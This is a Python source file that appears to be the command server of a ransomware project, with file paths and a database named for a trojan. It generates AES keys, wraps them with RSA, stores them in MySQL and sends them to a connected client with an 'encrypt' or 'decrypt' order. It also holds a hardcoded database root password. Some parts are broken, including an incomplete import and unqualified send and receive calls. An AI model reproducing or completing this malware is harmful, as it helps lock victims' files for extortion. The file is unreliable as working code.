import os
import socket
import ssl
import mysql.connector
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import PKCS1_OAEP
import base64
from random_word import RandomWords
from protocol


HOST = "0.0.0.0"
PORT = 44444

cert_pem = "D:\\python_programmers_clab\\TROJAN_RANSOMEWARE\\cert.pem"
key_pem = "D:\\python_programmers_clab\\TROJAN_RANSOMEWARE\\key.pem"

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile=cert_pem,keyfile=key_pem)

def save_encrypted_key_to_db(encrypted_key_b64):
    conn = mysql.connector.connect(
        host="localhost",
        user="root",
        password="Galking22!!!",
        database="my_server_trojan"
    )
    cursor = conn.cursor()

    cursor.execute("INSERT INTO encrypted_keys (encrypted_key) VALUES (%s)", (encrypted_key_b64,))
    conn.commit()

    print("Encrypted AES key has been saved successfully")

    cursor.close()
    conn.close()

def mysql_retrieve_last_word():
    conn = mysql.connector.connect(
        host="localhost",
        user="root",
        password="Galking22!!!",
        database="my_server_trojan"
    )
    cursor = conn.cursor()

    cursor.execute("SELECT word FROM random_words ORDER BY id DESC LIMIT 1")
    result = cursor.fetchone()
    word = result[0]

    cursor.close()
    conn.close()

    return word
    
def mysql_retrieve_last_key():
    conn = mysql.connector.connect(
        host="localhost",
        user="root",
        password="Galking22!!!",
        database="my_server_trojan"
    )
    cursor = conn.cursor()

    cursor.execute("SELECT encrypted_key FROM encrypted_keys ORDER BY id DESC LIMIT 1")

    result = cursor.fetchone()
    key = result[0] if result else None

    cursor.close()
    conn.close()

    return key
    
def generate_aes_key_from_secret(secret_word):
    hasher = SHA256.new()
    hasher.update(secret_word.encode())
    key = hasher.digest()
    return key

def encrypt_aes_key_with_rsa(aes_key):
    with open("server_RSA_public.pem", "rb") as f:
        public_key = RSA.import_key(f.read())
    cipher_rsa = PKCS1_OAEP.new(public_key)
    encrypted_key = cipher_rsa.encrypt(aes_key)

    # מקודד את הפלט לבייס64 לצורך שמירה כטקסט
    return base64.b64encode(encrypted_key).decode()

def decrypt_RSA_from_AES_key(encrypted_aes_key):
    with open("server_RSA_private.pem", "rb") as f:
        private_key = RSA.import_key(f.read())

    cipher_rsa = PKCS1_OAEP.new(private_key)
    
    encrypted_aes_key_bytes = base64.b64decode(encrypted_aes_key)
    aes_key = cipher_rsa.decrypt(encrypted_aes_key_bytes)
    
    return aes_key

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST,PORT))
        s.listen(1)
        
        with context.wrap_socket(s, server_side=True) as secure_sock:
            
            conn, address = secure_sock.accept()
            
            with conn:
                print(f"Got conn from {address}/nthe conn is using TLS")
                # Send to the client whether I want it to encrypt or decrypt
                # Need to change manually each time if we want it to encrypt or decrypt
                # For it to encrypt, you need to write to the variable "action" the value "encrypt"
                # For it to decrypt, you need to write to the variable "action" the value "decrypt"
                action = "decrypt"
                
                if action == "encrypt":
                    
                    r = RandomWords()
                    random_word = r.get_random_word()
                    aes_key = generate_aes_key_from_secret(random_word)
                    
                    aes_key_encrypt_by_RSA = encrypt_aes_key_with_rsa(aes_key)
                    save_encrypted_key_to_db(aes_key_encrypt_by_RSA)
                    
                    protocol.send(conn, aes_key)
                
                elif action == "decrypt":
                    encrypt_aes_key_by_rsa = mysql_retrieve_last_key()
                    
                    aes_key = decrypt_RSA_from_AES_key(encrypt_aes_key_by_rsa)

                    conn.sendall(aes_key + b"__END__")
                
                
                if action == "encrypt" or action == "decrypt":
                    send(conn, action)
                    
                answer = receive(conn).decode()
                print(answer)
                
if __name__ == "__main__":
     main()